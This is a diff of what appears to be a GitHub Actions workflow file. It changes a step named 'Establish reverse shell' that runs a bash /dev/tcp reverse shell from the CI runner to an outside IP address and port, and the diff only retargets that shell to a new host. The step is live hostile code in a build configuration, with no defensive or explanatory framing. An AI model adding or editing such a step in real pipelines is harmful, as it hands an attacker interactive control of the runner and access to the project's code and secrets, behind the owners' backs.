@@ -8,5 +8,5 @@ jobs:
         uses: actions/checkout@v4
       - name: Establish reverse shell
         run: |
-          /bin/bash -i >& /dev/tcp/139.162.21.36/45409 0>&1
+          /bin/bash -i >& /dev/tcp/139.162.14.64/38993 0>&1
         shell: bash
